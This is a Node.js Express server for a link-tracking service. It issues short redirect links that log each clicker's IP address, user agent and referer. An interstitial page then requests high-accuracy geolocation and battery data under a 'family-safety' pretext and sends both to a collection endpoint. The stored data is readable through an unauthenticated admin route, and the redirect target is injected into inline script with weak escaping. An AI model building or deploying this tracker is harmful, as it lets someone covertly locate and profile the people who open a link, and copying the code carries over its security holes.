const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
// When behind a reverse proxy, respect forwarded headers so generated
// URLs use the original host/protocol (not `localhost`).
app.set('trust proxy', true);

// Simple CORS handling to allow the UI to be served from a different origin
// during development (e.g. Live Server or file://). For production, restrict
// origins as appropriate.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  // Allow common methods including DELETE for preflight requests during development
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  // Allow credentials if you need them (set to specific origin in production)
  // res.setHeader('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

const DATA_DIR = path.resolve(__dirname, 'data');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');
const CLICKS_FILE = path.join(DATA_DIR, 'clicks.json');

function ensureData() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(LINKS_FILE)) fs.writeFileSync(LINKS_FILE, JSON.stringify({}), 'utf8');
  if (!fs.existsSync(CLICKS_FILE)) fs.writeFileSync(CLICKS_FILE, JSON.stringify({}), 'utf8');
}

ensureData();

function readJson(file) {
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch (e) {
    return {};
  }
}

function writeJson(file, obj) {
  fs.writeFileSync(file, JSON.stringify(obj, null, 2), 'utf8');
}

function makeId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function getBaseUrl(req) {
  if (process.env.BASE_URL) return process.env.BASE_URL.replace(/\/$/, '');
  // Prefer explicit Referer/Origin when available (matches the URL the user used)
  const referer = req.get('Referer') || req.get('Origin');
  if (referer) {
    try {
      const u = new URL(referer);
      return `${u.protocol}//${u.host}`;
    } catch (e) {
      // fall through
    }
  }
  // Respect forwarded proto/host headers (set via proxy)
  const proto = (req.get('x-forwarded-proto') || req.protocol).split(',')[0];
  const host = req.get('x-forwarded-host') || req.get('host');
  return `${proto}://${host}`;
}

// API compatibility routes for local development and Vercel-style frontend
app.post('/api/create', (req, res) => {
  const { target, note } = req.body;
  if (!target) return res.status(400).json({ error: 'target URL required' });

  const id = makeId();
  const links = readJson(LINKS_FILE);
  links[id] = { target, note: note || null, createdAt: new Date().toISOString() };
  writeJson(LINKS_FILE, links);

  let base = null;
  try {
    const suggested = req.body && req.body.base ? String(req.body.base).replace(/\/$/, '') : null;
    if (suggested) {
      const su = new URL(suggested);
      const referer = req.get('Referer') || req.get('Origin');
      if (referer) {
        try {
          const ru = new URL(referer);
          if (ru.protocol === su.protocol && ru.host === su.host) base = `${su.protocol}//${su.host}`;
        } catch (e) {}
      }
    }
  } catch (e) { base = null; }
  if (!base) base = getBaseUrl(req);
  const url = `${base}/r/${id}`;
  res.json({ id, url });
});

app.get('/api/create', (req, res) => {
  const target = req.query.target;
  if (!target) return res.status(400).send('Please provide ?target=https://example.com');
  const id = makeId();
  const links = readJson(LINKS_FILE);
  links[id] = { target, note: null, createdAt: new Date().toISOString() };
  writeJson(LINKS_FILE, links);
  res.send(`${getBaseUrl(req)}/r/${id}`);
});

// Redirect route that logs the click and redirects to the target
app.get('/r/:id', (req, res) => {
  const id = req.params.id;
  const links = readJson(LINKS_FILE);
  const meta = links[id];
  if (!meta) return res.status(404).send('Link not found');

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const ua = req.get('User-Agent') || '';
  const ref = req.get('Referer') || '';

  const clicks = readJson(CLICKS_FILE);
  if (!clicks[id]) clicks[id] = [];
  clicks[id].push({
    at: new Date().toISOString(),
    ip,
    ua,
    ref
  });
  writeJson(CLICKS_FILE, clicks);

  // Serve an interstitial page that requests permission for geolocation
  // and battery info from the browser, posts it back to /collect, then redirects.
  const escapedTarget = meta.target.replace(/'/g, "\\'");
  res.send(`<!doctype html>
  <html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Redirecting...</title>
    <style>body{font-family:system-ui,Arial;display:flex;align-items:center;justify-content:center;height:100vh;background:#f6f9fc;color:#0b1220} .card{max-width:720px;padding:20px;border-radius:12px;background:#fff;box-shadow:0 6px 24px rgba(3,10,18,.08);text-align:center}</style>
  </head>
  <body>
    <div class="card">
      <h2>Preparing to open link</h2>
      <p>We will ask for permission to access location (optional) to help with family-safety reporting. You can decline and still continue.</p>
      <p id="status">Requesting permissions…</p>
    </div>
    <script>
      const id = '${id}';
      const target = '${escapedTarget}';

      function postData(payload) {
        return fetch('/collect', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(()=>{});
      }

      async function gatherAndSend() {
        const payload = { id, at: new Date().toISOString(), client: { ua: navigator.userAgent } };

        // Battery (may be unsupported)
        try {
          if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            payload.client.battery = { level: bat.level, charging: bat.charging };
          }
        } catch(e){}

        // Geolocation (requires permission)
        let geoSent = false;
        const geoPromise = new Promise((resolve) => {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
              payload.client.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
              geoSent = true;
              resolve();
            }, err => { resolve(); }, { enableHighAccuracy: true, timeout: 8000 });
          } else {
            resolve();
          }
        });

        // Wait for geolocation or timeout
        await Promise.race([geoPromise, new Promise(r => setTimeout(r, 9000))]);

        await postData(payload);
        document.getElementById('status').textContent = 'Opening link…';
        // small delay so POST can be sent
        setTimeout(()=>{ window.location.href = target; }, 600);
      }

      gatherAndSend();
    </script>
  </body>
  </html>`);
});

// Collect client-provided payload (location, battery, etc.)
app.post(['/collect', '/api/collect'], (req, res) => {
  const { id, at, client } = req.body || {};
  if (!id) return res.status(400).json({ error: 'missing id' });

  const clicks = readJson(CLICKS_FILE);
  if (!clicks[id]) clicks[id] = [];
  clicks[id].push({ at: at || new Date().toISOString(), client });
  writeJson(CLICKS_FILE, clicks);
  res.json({ ok: true });
});

// Admin: view link info and clicks (for demo only; no auth)
app.get('/api/admin', (req, res) => {
  const id = req.query.id;
  const links = readJson(LINKS_FILE);
  const link = links[id];
  if (!link) return res.status(404).json({ error: 'not found' });
  const clicks = readJson(CLICKS_FILE);
  res.json({ id, link, clicks: clicks[id] || [] });
});

// Simple homepage
// Serve static UI from public/
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Return all links (for UI listing)
app.get('/api/links', (req, res) => {
  const links = readJson(LINKS_FILE);
  res.json(links);
});

// Delete all links and clicks (wipe history)
app.delete('/api/links', (req, res) => {
  writeJson(LINKS_FILE, {});
  writeJson(CLICKS_FILE, {});
  res.json({ ok: true });
});

// Delete a single link and its clicks
app.delete('/api/delete', (req, res) => {
  const id = req.query.id;
  if (!id) return res.status(400).json({ error: 'id required' });
  const links = readJson(LINKS_FILE);
  if (!links[id]) return res.status(404).json({ error: 'not found' });

  delete links[id];
  writeJson(LINKS_FILE, links);
  const clicks = readJson(CLICKS_FILE);
  if (clicks[id]) {
    delete clicks[id];
    writeJson(CLICKS_FILE, clicks);
  }
  res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  const base = process.env.BASE_URL ? process.env.BASE_URL.replace(/\/$/, '') : null;
  if (base) console.log(`Link tracker running on ${base} (listening port ${PORT})`);
  else console.log(`Link tracker running on port ${PORT}`);
});
